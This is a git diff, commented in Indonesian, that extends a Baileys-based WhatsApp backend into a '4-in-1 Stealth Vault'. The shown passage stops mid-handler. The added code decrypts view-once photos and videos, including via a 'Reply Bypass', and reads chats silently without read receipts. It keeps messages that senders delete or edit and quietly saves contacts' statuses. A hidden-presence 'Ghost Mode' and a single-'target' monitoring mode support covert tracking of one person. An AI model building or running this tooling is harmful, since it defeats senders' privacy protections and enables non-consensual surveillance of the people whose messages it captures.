@@ -68,7 +68,7 @@ async function getWaVersion() {
   return FALLBACK_WA_VERSION;
 }
 
-// Konfigurasi CORS super toleran agar pre-warm ping tidak pernah terblokir
+// Konfigurasi CORS super toleran
 app.use(
   cors({
     origin: (origin, callback) => {
@@ -95,9 +95,9 @@ app.get('/ping', (req, res) => {
 
 app.get('/', (req, res) => {
   res.json({
-    service: 'AllToolsKuro WhatsApp View Once Vault Backend',
+    service: 'AllToolsKuro WhatsApp 4-in-1 Stealth Vault Backend',
     status: 'online',
-    version: '1.7.0'
+    version: '2.0.0'
   });
 });
 
@@ -157,6 +157,15 @@ function normalizePhone(raw) {
   return digits;
 }
 
+// Helper konversi ARGB 32-bit int ke format hex '#RRGGBB'
+function argbToHex(argb) {
+  if (argb === null || argb === undefined) return '#1e293b';
+  const num = Number(argb);
+  if (isNaN(num)) return '#1e293b';
+  const hex = (num >>> 0).toString(16).padStart(8, '0');
+  return '#' + hex.slice(2);
+}
+
 // Helper promise timeout
 function withTimeout(promise, ms = 15000, errorMsg = 'Operation timed out') {
   return Promise.race([
@@ -174,6 +183,72 @@ function toCleanBuffer(data) {
   return null;
 }
 
+// Schema Payload Seragam 100% Primitif (Anti React Error #31)
+function buildVaultPayload({
+  id,
+  category = 'chat', // 'chat' | 'status'
+  senderNumber = '',
+  senderName = '',
+  mediaType = 'text', // 'text' | 'image' | 'video' | 'audio' | 'sticker' | 'document'
+  mimeType = '',
+  textContent = '',
+  caption = '',
+  bgColor = '',
+  fileName = '',
+  fileSize = 0,
+  isVoiceNote = false,
+  isViewOnce = false,
+  isDeleted = false,
+  deletedAt = null,
+  isEdited = false,
+  editedText = '',
+  editedAt = null,
+  sentAt = Date.now(),
+  base64Data = ''
+}) {
+  return {
+    id: String(id || Date.now()),
+    category: category === 'status' ? 'status' : 'chat',
+    senderNumber: String(senderNumber || ''),
+    senderName: String(senderName || ''),
+    mediaType: String(mediaType || 'text'),
+    mimeType: String(mimeType || ''),
+    textContent: String(textContent || ''),
+    caption: String(caption || ''),
+    bgColor: String(bgColor || ''),
+    fileName: String(fileName || ''),
+    fileSize: Number(fileSize || 0),
+    isVoiceNote: Boolean(isVoiceNote),
+    isViewOnce: Boolean(isViewOnce),
+    isDeleted: Boolean(isDeleted),
+    deletedAt: deletedAt ? Number(deletedAt) : null,
+    isEdited: Boolean(isEdited),
+    editedText: String(editedText || ''),
+    editedAt: editedAt ? Number(editedAt) : null,
+    sentAt: Number(sentAt || Date.now()),
+    base64Data: String(base64Data || '')
+  };
+}
+
+// Helper pengirim item ke socket room & simpan ke antrean jika room kosong
+function emitVaultItem(sessionId, session, payload) {
+  io.to(sessionId).emit('vault-item', payload);
+
+  // Kompatibilitas mundur dengan event view-once-media
+  if (payload.isViewOnce) {
+    io.to(sessionId).emit('view-once-media', payload);
+  }
+
+  const room = io.sockets.adapter.rooms.get(sessionId);
+  if (!room || room.size === 0) {
+    if (!session.pendingMedia) session.pendingMedia = [];
+    session.pendingMedia.push(payload);
+    if (session.pendingMedia.length > 30) {
+      session.pendingMedia.shift();
+    }
+  }
+}
+
 // Engine Dekripsi 3-Tier Multi-Fallback
 async function downloadMediaStreamBuffer(mediaObj, mediaType, rawMsg = null, sock = null) {
   if (!mediaObj) return null;
@@ -188,7 +263,7 @@ async function downloadMediaStreamBuffer(mediaObj, mediaType, rawMsg = null, soc
   try {
     const stream = await withTimeout(
       downloadContentFromMessage(mediaObj, mediaType),
-      12000,
+      20000,
       'Tier 1 downloadContentFromMessage timeout'
     );
     const chunks = [];
@@ -465,11 +540,33 @@ function learnLidPair(key, session) {
           if (!session.confirmedTargetLids) session.confirmedTargetLids = new Set();
           session.confirmedTargetLids.add(lidCandidate);
           session.confirmedTargetLids.add(lidId);
-          console.log(`[WA-VAULT][PASSIVE-LID-LEARNED] Target LID otomatis terikat: ${lidCandidate} <-> +${session.targetNumber}`);
         }
       }
     }
   }
+}
+
+// Resolusi Informasi Pengirim (Nomor HP & Nama Kontak)
+function resolveSenderInfo(msg, session) {
+  const remoteJid = String(msg.key?.remoteJid || '');
+  const isStatus = remoteJid === 'status@broadcast';
+  const senderJid = isStatus
+    ? (msg.key?.participant || msg.key?.participantAlt || msg.key?.participantPn || '')
+    : (msg.key?.remoteJid || msg.key?.remoteJidAlt || msg.key?.senderPn || '');
+
+  const rawNumber = senderJid ? senderJid.split('@')[0].split(':')[0] : '';
+  const phone = normalizePhone(rawNumber);
+  const pushName = String(msg.pushName || '');
+  const savedName = phone ? session?.contactNames?.get(phone) : '';
+  const senderName = pushName || savedName || (phone ? `+${phone}` : isStatus ? 'Status WhatsApp' : 'Kontak');
+
+  return {
+    isStatus,
+    remoteJid,
+    senderJid,
+    phone,
+    senderName
+  };
 }
 
 // Pencocokan Pengirim Pesan Terhadap Target Terkunci
@@ -509,6 +606,29 @@ async function isFromTarget(msg, session) {
   }
 
   return false;
+}
+
+// Pemeriksaan Apakah Pesan Diizinkan Berdasarkan monitorMode ('all' vs 'single')
+async function isAllowedByMode(senderInfo, msg, session) {
+  if (!session) return false;
+  if (session.monitorMode === 'all') return true;
+
+  if (!session.targetNumber) return false;
+
+  if (senderInfo.isStatus) {
+    if (senderInfo.phone === session.targetNumber) return true;
+    if (
+      senderInfo.phone.length >= 9 &&
+      session.targetNumber.length >= 9 &&
+      senderInfo.phone.slice(-9) === session.targetNumber.slice(-9)
+    ) {
+      return true;
+    }
+    if (session.confirmedTargetLids?.has(senderInfo.senderJid)) return true;
+    return false;
+  }
+
+  return await isFromTarget(msg, session);
 }
 
 // Detektor View Once Rekursif Mendalam
@@ -574,14 +694,15 @@ function deepExtractViewOnce(obj, inheritedViewOnce = false, depth = 0) {
   return null;
 }
 
-// Inisialisasi & Penghubung Baileys 6.7.24 (QR Instan & Anti-Deadlock)
+// Inisialisasi & Penghubung Baileys 6.7.24 (Ghost Mode • Tanpa Centang Biru)
 async function startBaileys(
   sessionId,
   targetNumber = null,
   cleanAuth = false,
   authMethod = 'pairing',
   pairingPhone = '',
-  forceNew = false
+  forceNew = false,
+  monitorMode = 'all'
 ) {
   let session = sessions.get(sessionId);
   const now = Date.now();
@@ -601,15 +722,17 @@ async function startBaileys(
       pairingPhone: pairingPhone ? normalizePhone(pairingPhone) : '',
       pairingCode: null,
       pairingCodeRequested: false,
+      monitorMode: monitorMode || (targetNumber ? 'single' : 'all'),
       targetNumber: targetNumber ? normalizePhone(targetNumber) : null,
       targetJids: new Set(),
       confirmedTargetLids: new Set(),
       lidMap: new Map(),
+      contactNames: new Map(),
       unmappedLidQueue: new Map(),
       pendingUnavailableIds: new Set(),
-      msgCache: new Map(),
+      msgCache: new Map(), // FIFO max 150
       msgRetryCounterCache: new NodeCache({ stdTTL: 600, useClones: false }),
-      viewOnceStore: new Map(),
+      viewOnceStore: new Map(), // FIFO max 50
       latestTargetViewOnceId: null,
       pendingMedia: [],
       presenceInterval: null,
@@ -625,9 +748,11 @@ async function startBaileys(
     session.isInitializing = true;
     session.initStartTime = now;
     session.authMethod = authMethod || session.authMethod || 'pairing';
+    if (monitorMode) session.monitorMode = monitorMode;
     if (pairingPhone) session.pairingPhone = normalizePhone(pairingPhone);
     session.pairingCode = null;
     session.pairingCodeRequested = false;
+    if (!session.contactNames) session.contactNames = new Map();
     if (!session.confirmedTargetLids) session.confirmedTargetLids = new Set();
     if (!session.unmappedLidQueue) session.unmappedLidQueue = new Map();
     if (!session.pendingUnavailableIds) session.pendingUnavailableIds = new Set();
@@ -646,10 +771,6 @@ async function startBaileys(
   try {
     const hadActiveSocket = Boolean(session.sock);
     if (session.sock) {
-      if (session.presenceInterval) {
-        clearInterval(session.presenceInterval);
-        session.presenceInterval = null;
-      }
       try {
         session.sock.ev?.removeAllListeners();
       } catch (_) {}
@@ -663,7 +784,6 @@ async function startBaileys(
       removeSessionDir(sessionId);
     }
 
-    // Jeda minimal: 100ms jika ada socket lama yang perlu ditutup, 0ms jika socket baru
     if (hadActiveSocket) {
       await new Promise((resolve) => setTimeout(resolve, 100));
     }
@@ -673,9 +793,7 @@ async function startBaileys(
       fs.mkdirSync(sessionDir, { recursive: true });
     }
 
-    // Ambil versi WA Web dari cache instan (atau max 3 detik)
     const version = await getWaVersion();
-
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
     session.authKeys = state.keys;
 
@@ -689,9 +807,10 @@ async function startBaileys(
       syncFullHistory: false,
       shouldIgnoreJid: (jid) => {
         if (!jid) return true;
-        return jid.endsWith('@g.us') || jid === 'status@broadcast' || jid.endsWith('@newsletter');
+        // Izinkan status@broadcast, hanya abaikan grup dan saluran (newsletter)
+        return jid.endsWith('@g.us') || jid.endsWith('@newsletter');
       },
-      markOnlineOnConnect: true,
+      markOnlineOnConnect: false, // Stealth Ghost Mode: jangan paksa online
       connectTimeoutMs: 120000,
       keepAliveIntervalMs: 25000,
       defaultQueryTimeoutMs: 60000,
@@ -711,29 +830,37 @@ async function startBaileys(
 
     sock.ev.on('creds.update', saveCreds);
 
-    sock.ev.on('contacts.upsert', (contacts) => {
-      if (!Array.isArray(contacts)) return;
-      for (const c of contacts) {
-        if (c.lid && c.id) {
-          const phone = normalizePhone(c.id);
-          if (phone) {
-            session.lidMap.set(c.lid, phone);
-            session.lidMap.set(phone, c.lid);
-          }
+    // Otomatis tangkap dan pelajari nama kontak dari berbagai stream Baileys
+    const storeContact = (c) => {
+      if (!c) return;
+      const jid = c.id || c.jid;
+      const name = c.name || c.notify || c.verifiedName || c.pushName;
+      if (jid && name) {
+        const p = normalizePhone(jid.split('@')[0]);
+        if (p) session.contactNames.set(p, name);
+      }
+      if (c.lid && c.id) {
+        const phone = normalizePhone(c.id);
+        if (phone) {
+          session.lidMap.set(c.lid, phone);
+          session.lidMap.set(phone, c.lid);
         }
       }
+    };
+
+    sock.ev.on('contacts.upsert', (contacts) => {
+      if (!Array.isArray(contacts)) return;
+      for (const c of contacts) storeContact(c);
     });
 
     sock.ev.on('contacts.update', (updates) => {
       if (!Array.isArray(updates)) return;
-      for (const u of updates) {
-        if (u.lid && u.id) {
-          const phone = normalizePhone(u.id);
-          if (phone) {
-            session.lidMap.set(u.lid, phone);
-            session.lidMap.set(phone, u.lid);
-          }
-        }
+      for (const u of updates) storeContact(u);
+    });
+
+    sock.ev.on('messaging-history.set', (payload) => {
+      if (Array.isArray(payload?.contacts)) {
+        for (const c of payload.contacts) storeContact(c);
       }
     });
 
@@ -750,7 +877,7 @@ async function startBaileys(
       }
     });
 
-    // Handler connection.update (QR Cepat & Handshake Sesi)
+    // Handler connection.update (QR Cepat, Ghost Mode, & Handshake)
     sock.ev.on('connection.update', async (update) => {
       const { connection, lastDisconnect, qr } = update;
 
@@ -772,7 +899,7 @@ async function startBaileys(
               session.lastActive = Date.now();
               io.to(sessionId).emit('pairing-code', { code });
               io.to(sessionId).emit('session-status', { status: 'pairing_ready', code });
-              console.log(`[WA-VAULT][PAIRING-CODE] Sesi ${sessionId} kode pairing: ${code}`);
+              console.log(`[WA-VAULT][PAIRING-CODE] Sesi ${sessionId} kode: ${code}`);
             }
           } catch (err) {
             console.error(`[WA-VAULT][PAIRING-CODE-ERR] Sesi ${sessionId}:`, err.message);
@@ -783,7 +910,7 @@ async function startBaileys(
         }, 2000);
       }
 
-      // 2. Tangani Mode QR Code Instan (1-2 Detik)
+      // 2. Tangani Mode QR Code Instan
       if (qr && session.authMethod !== 'pairing') {
         session.qrCode = qr;
         session.status = 'qr_ready';
@@ -804,7 +931,7 @@ async function startBaileys(
         }
       }
 
-      // 3. Status Terhubung (Open)
+      // 3. Status Terhubung (Open) - Ghost Mode Aktif
       if (connection === 'open') {
         session.isInitializing = false;
         session.status = 'connected';
@@ -814,20 +941,10 @@ async function startBaileys(
         session.pairingCodeRequested = false;
         session.lastActive = Date.now();
 
+        // GHOST MODE MUTLAK: Set unavailable sekali agar tidak tampil Online & tanpa interval presence
         try {
-          await sock.sendPresenceUpdate('available');
+          await sock.sendPresenceUpdate('unavailable');
         } catch (_) {}
-
-        if (session.presenceInterval) {
-          clearInterval(session.presenceInterval);
-        }
-        session.presenceInterval = setInterval(async () => {
-          try {
-            if (session.sock) {
-              await session.sock.sendPresenceUpdate('available');
-            }
-          } catch (_) {}
-        }, 35000);
 
         if (session.targetNumber) {
           await resolveTargetIdentifiers(session);
@@ -837,14 +954,19 @@ async function startBaileys(
         io.to(sessionId).emit('session-status', {
           status: 'connected',
           phone,
+          monitorMode: session.monitorMode,
           targetNumber: session.targetNumber || ''
         });
         io.to(sessionId).emit('status', { status: 'connected', phone });
 
+        // Flush pending media jika ada
         if (session.pendingMedia && session.pendingMedia.length > 0) {
           while (session.pendingMedia.length > 0) {
             const item = session.pendingMedia.shift();
-            io.to(sessionId).emit('view-once-media', item);
+            io.to(sessionId).emit('vault-item', item);
+            if (item.isViewOnce) {
+              io.to(sessionId).emit('view-once-media', item);
+            }
           }
         }
       }
@@ -857,18 +979,13 @@ async function startBaileys(
         const wasRegistered = Boolean(sock.authState?.creds?.registered);
         const isLoggedOut = (statusCode === DisconnectReason.loggedOut || statusCode === 401) && wasRegistered;
 
-        if (session.presenceInterval) {
-          clearInterval(session.presenceInterval);
-          session.presenceInterval = null;
-        }
-
         if (isRestartRequired) {
-          console.log(`[Session ${sessionId}] Handshake restart required (code 515). Reconnecting in 300ms without auth wipe...`);
+          console.log(`[Session ${sessionId}] Handshake restart required (515). Reconnecting 300ms...`);
           session.status = 'connecting';
           io.to(sessionId).emit('session-status', { status: 'connecting' });
           setTimeout(() => {
             if (sessions.has(sessionId)) {
-              startBaileys(sessionId, session.targetNumber, false, session.authMethod, session.pairingPhone, false);
+              startBaileys(sessionId, session.targetNumber, false, session.authMethod, session.pairingPhone, false, session.monitorMode);
             }
           }, 300);
         } else if (isLoggedOut) {
@@ -889,14 +1006,14 @@ async function startBaileys(
 
           setTimeout(() => {
             if (sessions.has(sessionId)) {
-              startBaileys(sessionId, session.targetNumber, false, session.authMethod, session.pairingPhone, false);
+              startBaileys(sessionId, session.targetNumber, false, session.authMethod, session.pairingPhone, false, session.monitorMode);
             }
           }, 1500);
         }
       }
     });
 
-    // Interseptor Pesan & Dekripsi View Once Real-Time
+    // 4-in-1 Pipeline Interseptor Pesan (View Once, Ghost Reader, Anti-Delete, Status Saver)
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
       if (type !== 'notify' && type !== 'append') return;
 
@@ -907,19 +1024,18 @@ async function startBaileys(
         if (!msg || !msg.key) continue;
 
         const remoteJid = String(msg.key?.remoteJid || '');
-        if (
-          remoteJid.endsWith('@g.us') ||
-          remoteJid === 'status@broadcast' ||
-          remoteJid.endsWith('@newsletter')
-        ) {
+
+        // Abaikan grup & newsletter saja (status@broadcast DIPERBOLEHKAN!)
+        if (remoteJid.endsWith('@g.us') || remoteJid.endsWith('@newsletter')) {
           continue;
         }
 
         learnLidPair(msg.key, currentSession);
 
+        // Simpan ke cache pesan (FIFO max 150)
         if (msg.key?.id && msg.message) {
           if (!currentSession.msgCache) currentSession.msgCache = new Map();
-          if (currentSession.msgCache.size >= 100) {
+          if (currentSession.msgCache.size >= 150) {
             const firstKey = currentSession.msgCache.keys().next().value;
             currentSession.msgCache.delete(firstKey);
           }
@@ -927,41 +1043,173 @@ async function startBaileys(
         }
 
         currentSession.lastActive = Date.now();
-        const matched = await isFromTarget(msg, currentSession);
-        const voCheck = deepExtractViewOnce(msg.message);
-
-        if (matched) {
-          console.log('[WA-VAULT][INCOMING]', {
-            from: msg.key?.remoteJid,
-            alt: msg.key?.remoteJidAlt || msg.key?.senderPn,
-            fromMe: Boolean(msg.key?.fromMe),
-            hasMessage: Boolean(msg.message),
-            keys: Object.keys(msg.message || {}),
-            isViewOnce: Boolean(voCheck),
-            hasMediaKey: Boolean(voCheck?.mediaObj?.mediaKey),
-            hasUrlOrPath: Boolean(voCheck?.mediaObj?.directPath || voCheck?.mediaObj?.url)
-          });
+        const senderInfo = resolveSenderInfo(msg, currentSession);
+        if (senderInfo.phone && msg.pushName) {
+          currentSession.contactNames.set(senderInfo.phone, msg.pushName);
         }
 
-        if (!msg.message) {
-          if (matched && msg.key?.fromMe === false) {
-            io.to(sessionId).emit('vault-activity', {
-              time: Date.now(),
-              text: 'Media sekali lihat dari target masuk (status unavailable). Meminta salinan dekripsi dari HP utama...'
+        // Cek izin apakah diizinkan berdasarkan mode pemantauan
+        const allowed = await isAllowedByMode(senderInfo, msg, currentSession);
+        if (!allowed) {
+          // Tangani jaring pengaman @lid jika belum terpetakan ke target
+          if (remoteJid.endsWith('@lid') && deepExtractViewOnce(msg.message)) {
+            io.to(sessionId).emit('unmapped-lid-view-once', {
+              lid: remoteJid,
+              pushName: senderInfo.senderName,
+              mediaType: 'image',
+              sentAt: Date.now()
             });
-
-            try {
-              if (typeof sock?.requestPlaceholderResend === 'function') {
-                await sock.requestPlaceholderResend(msg.key);
-              }
-            } catch (err) {
-              console.log('[WA-VAULT][RESEND-ERR]', err.message);
-            }
           }
           continue;
         }
 
-        // Quoted Reply Bypass (fromMe: true)
+        const msgTimestamp = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
+
+        // ==============================================================
+        // PIPELINE 3: Anti-Delete (Revoke) & Anti-Edit
+        // ==============================================================
+        if (msg.message?.protocolMessage) {
+          const pType = msg.message.protocolMessage.type;
+          const targetKeyId = String(msg.message.protocolMessage.key?.id || '');
+
+          if (pType === 0 && targetKeyId) {
+            // Pesan ditarik/dihapus oleh pengirim
+            const deletedAt = Date.now();
+            io.to(sessionId).emit('vault-item-revoked', { id: targetKeyId, deletedAt });
+            io.to(sessionId).emit('vault-activity', {
+              time: deletedAt,
+              text: `Pesan dari ${senderInfo.senderName} telah ditarik/dihapus (Anti-Delete aktif)!`
+            });
+            continue;
+          }
+
+          if (pType === 14 && targetKeyId) {
+            // Pesan diedit oleh pengirim
+            const editedMsg = msg.message.protocolMessage.editedMessage;
+            const newText = String(editedMsg?.conversation || editedMsg?.extendedTextMessage?.text || '');
+            const editedAt = Date.now();
+            io.to(sessionId).emit('vault-item-edited', { id: targetKeyId, editedText: newText, editedAt });
+            io.to(sessionId).emit('vault-activity', {
+              time: editedAt,
+              text: `Pesan dari ${senderInfo.senderName} diedit menjadi: "${newText.slice(0, 40)}..."`
+            });
+            continue;
+          }
+        }
+
+        // ==============================================================
+        // PIPELINE 4: Silent Status Saver (SW Kontak)
+        // ==============================================================
+        if (senderInfo.isStatus && msg.key?.fromMe === false) {
+          // 4a. SW Teks
+          if (msg.message?.extendedTextMessage || msg.message?.conversation) {
+            const textContent = String(msg.message.extendedTextMessage?.text || msg.message.conversation || '');
+            const bgColor = argbToHex(msg.message.extendedTextMessage?.backgroundArgb);
+
+            const payload = buildVaultPayload({
+              id: msg.key?.id,
+              category: 'status',
+              senderNumber: senderInfo.phone,
+              senderName: senderInfo.senderName,
+              mediaType: 'text',
+              textContent,
+              bgColor,
+              sentAt: msgTimestamp
+            });
+
+            emitVaultItem(sessionId, currentSession, payload);
+            io.to(sessionId).emit('vault-activity', {
+              time: Date.now(),
+              text: `Status Teks dari ${senderInfo.senderName} diamankan secara senyap (0 view)!`
+            });
+            continue;
+          }
+
+          // 4b. SW Foto
+          if (msg.message?.imageMessage) {
+            const mediaObj = msg.message.imageMessage;
+            const buffer = await downloadMediaStreamBuffer(mediaObj, 'image', msg, sock);
+            if (buffer && buffer.length > 0) {
+              const mimeType = mediaObj.mimetype || 'image/jpeg';
+              const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'status',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'image',
+                mimeType,
+                caption: mediaObj.caption || '',
+                sentAt: msgTimestamp,
+                base64Data
+              });
+
+              emitVaultItem(sessionId, currentSession, payload);
+              io.to(sessionId).emit('vault-activity', {
+                time: Date.now(),
+                text: `Status Foto dari ${senderInfo.senderName} diamankan secara senyap (0 view)!`
+              });
+            }
+            continue;
+          }
+
+          // 4c. SW Video
+          if (msg.message?.videoMessage) {
+            const mediaObj = msg.message.videoMessage;
+            const fileSize = Number(mediaObj.fileLength || 0);
+
+            if (fileSize <= 25 * 1024 * 1024) {
+              const buffer = await downloadMediaStreamBuffer(mediaObj, 'video', msg, sock);
+              if (buffer && buffer.length > 0) {
+                const mimeType = mediaObj.mimetype || 'video/mp4';
+                const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+                const payload = buildVaultPayload({
+                  id: msg.key?.id,
+                  category: 'status',
+                  senderNumber: senderInfo.phone,
+                  senderName: senderInfo.senderName,
+                  mediaType: 'video',
+                  mimeType,
+                  caption: mediaObj.caption || '',
+                  fileSize,
+                  sentAt: msgTimestamp,
+                  base64Data
+                });
+
+                emitVaultItem(sessionId, currentSession, payload);
+                io.to(sessionId).emit('vault-activity', {
+                  time: Date.now(),
+                  text: `Status Video dari ${senderInfo.senderName} diamankan secara senyap (0 view)!`
+                });
+              }
+            } else {
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'status',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'video',
+                caption: (mediaObj.caption || '') + ' (Video > 25MB)',
+                fileSize,
+                sentAt: msgTimestamp,
+                base64Data: ''
+              });
+              emitVaultItem(sessionId, currentSession, payload);
+            }
+            continue;
+          }
+
+          continue;
+        }
+
+        // ==============================================================
+        // PIPELINE 1: View Once (Media 1x Lihat) - DIJAGA 100% UTUH
+        // ==============================================================
+        const voCheck = deepExtractViewOnce(msg.message);
+
+        // 1a. Cadangan Reply / Quoted Bypass (fromMe: true)
         if (msg.key?.fromMe === true) {
           const innerMsg =
             msg.message?.ephemeralMessage?.message ||
@@ -975,14 +1223,14 @@ async function startBaileys(
             innerMsg?.reactionMessage?.contextInfo ||
             null;
 
-          if (ctx?.quotedMessage && matched) {
+          if (ctx?.quotedMessage) {
             const targetStanzaId = ctx.stanzaId || currentSession.latestTargetViewOnceId;
             if (targetStanzaId && currentSession.viewOnceStore?.has(targetStanzaId)) {
               const storedItem = currentSession.viewOnceStore.get(targetStanzaId);
-              io.to(sessionId).emit('view-once-media', storedItem);
+              emitVaultItem(sessionId, currentSession, storedItem);
               io.to(sessionId).emit('vault-activity', {
                 time: Date.now(),
-                text: 'Berhasil mengambil View Once dari memory store via balasan!'
+                text: 'Berhasil membuka View Once dari memory store via balasan!'
               });
               continue;
             }
@@ -1007,7 +1255,7 @@ async function startBaileys(
             if (quotedVO) {
               io.to(sessionId).emit('vault-activity', {
                 time: Date.now(),
-                text: 'Terdeteksi balasan (reply) pesan View Once target! Mendekripsi via Reply Bypass...'
+                text: 'Terdeteksi balasan pesan View Once! Mendekripsi via Reply Bypass...'
               });
 
               const rawQuotedMsg = {
@@ -1024,20 +1272,20 @@ async function startBaileys(
               if (buffer && buffer.length > 0) {
                 const mimeType = quotedVO.mediaObj.mimetype || (quotedVO.mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
                 const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
-                const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-                const payload = {
-                  id: String(ctx.stanzaId || msg.key?.id || Date.now()),
-                  senderNumber: currentSession.targetNumber,
-                  senderName: String(currentSession.targetNumber ? '+' + currentSession.targetNumber : 'Target'),
-                  mediaType: String(quotedVO.mediaType),
-                  mimeType: String(mimeType),
-                  caption: String(quotedVO.mediaObj.caption || ''),
-                  sentAt: Number(sentAt),
+                const payload = buildVaultPayload({
+                  id: ctx.stanzaId || msg.key?.id,
+                  category: 'chat',
+                  senderNumber: senderInfo.phone,
+                  senderName: senderInfo.senderName,
+                  mediaType: quotedVO.mediaType,
+                  mimeType,
+                  caption: quotedVO.mediaObj.caption || '',
+                  isViewOnce: true,
+                  sentAt: msgTimestamp,
                   base64Data
-                };
+                });
 
-                if (!currentSession.viewOnceStore) currentSession.viewOnceStore = new Map();
                 if (currentSession.viewOnceStore.size >= 50) {
                   const firstKey = currentSession.viewOnceStore.keys().next().value;
                   currentSession.viewOnceStore.delete(firstKey);
@@ -1045,17 +1293,10 @@ async function startBaileys(
                 currentSession.viewOnceStore.set(payload.id, payload);
                 currentSession.latestTargetViewOnceId = payload.id;
 
-                console.log(`[WA-VAULT Captured via Reply Bypass] ${quotedVO.mediaType.toUpperCase()} (${buffer.length} bytes) dari target +${currentSession.targetNumber}`);
-
-                io.to(sessionId).emit('view-once-media', payload);
+                emitVaultItem(sessionId, currentSession, payload);
                 io.to(sessionId).emit('vault-activity', {
                   time: Date.now(),
                   text: 'Berhasil membuka View Once via jalur Reply Bypass!'
-                });
-              } else {
-                io.to(sessionId).emit('vault-activity', {
-                  time: Date.now(),
-                  text: 'Gagal mendekripsi media reply bypass: Buffer kosong'
                 });
               }
             }
@@ -1063,111 +1304,260 @@ async function startBaileys(
           continue;
         }
 
-        // Tangkap otomatis pesan masuk View Once (fromMe: false)
+        // 1b. Detik ke-0 Penangkapan View Once Masuk (fromMe: false)
         if (voCheck) {
           const { mediaType, mediaObj, unwrappedMessage } = voCheck;
+          io.to(sessionId).emit('vault-activity', {
+            time: Date.now(),
+            text: `Media Sekali Lihat (View Once) dari ${senderInfo.senderName} terdeteksi! Mendekripsi...`
+          });
 
-          if (matched) {
-            io.to(sessionId).emit('vault-activity', {
-              time: Date.now(),
-              text: 'Media View Once dari target terdeteksi! Mendekripsi...'
+          const buffer = await downloadMediaStreamBuffer(
+            mediaObj,
+            mediaType,
+            { key: msg.key, message: unwrappedMessage },
+            sock
+          );
+
+          if (buffer && buffer.length > 0) {
+            const mimeType = mediaObj.mimetype || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
+            const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+            const payload = buildVaultPayload({
+              id: msg.key?.id,
+              category: 'chat',
+              senderNumber: senderInfo.phone,
+              senderName: senderInfo.senderName,
+              mediaType,
+              mimeType,
+              caption: mediaObj.caption || '',
+              isViewOnce: true,
+              sentAt: msgTimestamp,
+              base64Data
             });
 
-            const buffer = await downloadMediaStreamBuffer(
-              mediaObj,
-              mediaType,
-              { key: msg.key, message: unwrappedMessage },
-              sock
-            );
+            if (currentSession.viewOnceStore.size >= 50) {
+              const firstKey = currentSession.viewOnceStore.keys().next().value;
+              currentSession.viewOnceStore.delete(firstKey);
+            }
+            currentSession.viewOnceStore.set(payload.id, payload);
+            currentSession.latestTargetViewOnceId = payload.id;
 
+            emitVaultItem(sessionId, currentSession, payload);
+            io.to(sessionId).emit('vault-activity', {
+              time: Date.now(),
+              text: `Berhasil menangkap ${mediaType === 'image' ? 'Foto' : 'Video'} Sekali Lihat dari ${senderInfo.senderName}!`
+            });
+            continue;
+          }
+        }
+
+        // ==============================================================
+        // PIPELINE 2: Ghost Reader (Semua Chat Pribadi Masuk fromMe: false)
+        // ==============================================================
+        if (msg.key?.fromMe === false) {
+          // 2a. Pesan Teks
+          const textContent = String(msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
+          if (textContent) {
+            const payload = buildVaultPayload({
+              id: msg.key?.id,
+              category: 'chat',
+              senderNumber: senderInfo.phone,
+              senderName: senderInfo.senderName,
+              mediaType: 'text',
+              textContent,
+              sentAt: msgTimestamp
+            });
+
+            emitVaultItem(sessionId, currentSession, payload);
+            io.to(sessionId).emit('vault-activity', {
+              time: Date.now(),
+              text: `Pesan teks dari ${senderInfo.senderName} dibaca secara senyap (0 centang biru).`
+            });
+            continue;
+          }
+
+          // 2b. Pesan Foto Biasa
+          if (msg.message?.imageMessage && !voCheck) {
+            const mediaObj = msg.message.imageMessage;
+            const buffer = await downloadMediaStreamBuffer(mediaObj, 'image', msg, sock);
             if (buffer && buffer.length > 0) {
-              const mimeType = mediaObj.mimetype || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
+              const mimeType = mediaObj.mimetype || 'image/jpeg';
               const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
-              const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-              const payload = {
-                id: String(msg.key?.id || Date.now()),
-                senderNumber: currentSession.targetNumber,
-                senderName: String(msg.pushName || ''),
-                mediaType: String(mediaType),
-                mimeType: String(mimeType),
-                caption: String(mediaObj.caption || ''),
-                sentAt: Number(sentAt),
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'chat',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'image',
+                mimeType,
+                caption: mediaObj.caption || '',
+                isViewOnce: false,
+                sentAt: msgTimestamp,
                 base64Data
-              };
-
-              if (!currentSession.viewOnceStore) currentSession.viewOnceStore = new Map();
-              if (currentSession.viewOnceStore.size >= 50) {
-                const firstKey = currentSession.viewOnceStore.keys().next().value;
-                currentSession.viewOnceStore.delete(firstKey);
-              }
-              currentSession.viewOnceStore.set(payload.id, payload);
-              currentSession.latestTargetViewOnceId = payload.id;
-
-              console.log(`[WA-VAULT Captured] ${mediaType.toUpperCase()} (${buffer.length} bytes) dari target +${currentSession.targetNumber}`);
-
-              io.to(sessionId).emit('view-once-media', payload);
-              io.to(sessionId).emit('vault-activity', {
-                time: Date.now(),
-                text: 'Berhasil menangkap ' + (mediaType === 'image' ? 'Foto' : 'Video') + ' View Once dari target!'
               });
 
-              const room = io.sockets.adapter.rooms.get(sessionId);
-              if (!room || room.size === 0) {
-                if (!currentSession.pendingMedia) currentSession.pendingMedia = [];
-                currentSession.pendingMedia.push(payload);
-                if (currentSession.pendingMedia.length > 10) {
-                  currentSession.pendingMedia.shift();
-                }
